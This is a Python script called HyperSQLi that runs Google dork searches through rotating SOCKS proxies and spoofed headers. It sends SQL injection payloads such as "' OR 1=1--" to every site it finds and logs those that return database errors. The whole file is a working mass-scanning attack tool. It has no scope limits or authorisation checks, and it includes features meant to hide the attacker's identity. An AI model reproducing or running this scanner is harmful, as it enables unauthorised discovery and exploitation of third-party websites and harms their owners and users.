#!/usr/bin/python3
# HyperSQLi - High-Speed SQLi Scanner
# Version 2.1.0
import sys
import os
import re
import random
import time
import threading
import logging
import socket
import json
from typing import List, Tuple, Dict, Optional
from datetime import datetime
import urllib.request
import urllib.parse
import urllib.error
from concurrent.futures import ThreadPoolExecutor

try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False

# Configuration
CONFIG = {
    "max_threads": 50,
    "timeout": 3,
    "delay_min": 0.1,
    "delay_max": 0.5,
    "max_pages": 10,
    "output_dir": "sqli_scan_results",
    "user_agent_file": "useragents.txt"
}

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler("sqli_scan.log"),
        logging.StreamHandler()
    ]
)

class HyperSQLi:
    def __init__(self, dork_file: str, proxy_file: str):
        self.dork_file = dork_file
        self.proxy_file = proxy_file
        self.proxies = self._load_proxies()
        self.user_agents = self._load_user_agents()
        self.results: Dict[str, List[str]] = {"vulnerable": [], "errors": []}
        self.lock = threading.Lock()
        self._setup_output_dir()

    def _setup_output_dir(self) -> None:
        if not os.path.exists(CONFIG["output_dir"]):
            os.makedirs(CONFIG["output_dir"])

    def _load_proxies(self) -> List[Tuple[str, int]]:
        proxies = []
        try:
            with open(self.proxy_file, "r") as f:
                for line in f.read().splitlines():
                    if ":" in line:
                        host, port = line.split(":")
                        proxies.append((host.strip(), int(port)))
            logging.info(f"Loaded {len(proxies)} proxies")
            return proxies
        except Exception as e:
            logging.error(f"Failed to load proxies: {e}")
            return []

    def _load_user_agents(self) -> List[str]:
        try:
            with open(CONFIG["user_agent_file"], "r") as f:
                agents = [line.strip() for line in f.read().splitlines() if line.strip()]
            if not agents:
                raise ValueError("No user agents found")
            logging.info(f"Loaded {len(agents)} user agents")
            return agents
        except Exception as e:
            logging.error(f"Failed to load user agents: {e}. Using default.")
            return ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"]

    def _configure_proxy(self) -> None:
        if not SOCKS_AVAILABLE or not self.proxies:
            return
        try:
            proxy_host, proxy_port = random.choice(self.proxies)
            socks.set_default_proxy(socks.SOCKS5, proxy_host, proxy_port)
            socket.socket = socks.socksocket
        except Exception:
            pass

    def _random_ip(self) -> str:
        return ".".join(str(random.randint(0, 255)) for _ in range(4))

    def _create_opener(self) -> urllib.request.OpenerDirector:
        opener = urllib.request.build_opener()
        headers = [
            ('User-Agent', random.choice(self.user_agents)),
            ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'),
            ('Accept-Language', 'en-US,en;q=0.5'),
            ('X-Forwarded-For', self._random_ip()),
            ('Connection', 'keep-alive')
        ]
        opener.addheaders = headers
        return opener

    def _detect_vulnerability(self, content: str) -> Optional[str]:
        patterns = [
            re.compile(r"(?i)sql syntax.*mysql"),
            re.compile(r"(?i)mysql.*error"),
            re.compile(r"(?i)warning: mysql"),
            re.compile(r"(?i)unclosed quotation"),
            re.compile(r"(?i)sql error"),
            re.compile(r"(?i)you have an error in your sql syntax")
        ]
        for pattern in patterns:
            if pattern.search(content):
                return pattern.pattern
        return None

    def test_url(self, url: str) -> None:
        payloads = ["'", "1' OR '1'='1", "' OR 1=1--"]
        opener = self._create_opener()
        for payload in payloads:
            test_url = f"{url}{payload}"
            try:
                self._configure_proxy()
                with opener.open(test_url, timeout=CONFIG["timeout"]) as resp:
                    content = resp.read().decode('utf-8', errors='ignore')
                    vuln_pattern = self._detect_vulnerability(content)
                    if vuln_pattern:
                        with self.lock:
                            self.results["vulnerable"].append(f"{test_url} - {vuln_pattern}")
                        logging.info(f"VULN: {test_url}")
                        return
            except Exception:
                pass
            time.sleep(random.uniform(CONFIG["delay_min"], CONFIG["delay_max"]))

    def crawl_google(self, dork: str, page: int = 0) -> None:
        if page >= CONFIG["max_pages"]:
            return
        opener = self._create_opener()
        base_url = "https://www.google.com/search"
        params = {
            "q": dork,
            "start": page * 10,
            "hl": "en",
            "filter": "0"
        }
        try:
            search_url = f"{base_url}?{urllib.parse.urlencode(params)}"
            with opener.open(search_url, timeout=CONFIG["timeout"]) as resp:
                content = resp.read().decode('utf-8', errors='ignore')
            urls = set()
            for link in re.findall(r'/url\?q=(.+?)&', content):
                url = urllib.parse.unquote(link)
                if not any(x in url for x in ["google.com", "youtube.com", "wikipedia.org"]):
                    urls.add(url)
            with ThreadPoolExecutor(max_workers=CONFIG["max_threads"]) as executor:
                executor.map(self.test_url, urls)
            if urls:
                self.crawl_google(dork, page + 1)
        except urllib.error.HTTPError as e:
            if e.code == 429:
                self._configure_proxy()
                time.sleep(1)
                self.crawl_google(dork, page)
        except Exception:
            pass

    def save_results(self) -> None:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = f"{CONFIG['output_dir']}/scan_results_{timestamp}.json"
        with self.lock:
            with open(output_file, "w") as f:
                json.dump(self.results, f, indent=2)
        logging.info(f"Results saved to {output_file}")

    def run(self) -> None:
        try:
            with open(self.dork_file, "r") as f:
                dorks = [d.strip() for d in f.read().splitlines() if d.strip()]
            if not dorks:
                logging.error("No dorks found in file")
                return
            logging.info(f"Starting high-speed scan with {len(dorks)} dorks")
            with ThreadPoolExecutor(max_workers=min(len(dorks), CONFIG["max_threads"])) as executor:
                executor.map(self.crawl_google, dorks)
            self.save_results()
        except Exception as e:
            logging.error(f"Scan failed: {e}")
            self.save_results()

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <dork_file> <proxy_file>")
        sys.exit(1)
    dork_file, proxy_file = sys.argv[1], sys.argv[2]
    for file in (dork_file, proxy_file, CONFIG["user_agent_file"]):
        if not os.path.isfile(file):
            logging.error(f"File not found: {file}")
            sys.exit(1)
    scanner = HyperSQLi(dork_file, proxy_file)
    scanner.run()

if __name__ == "__main__":
    main()
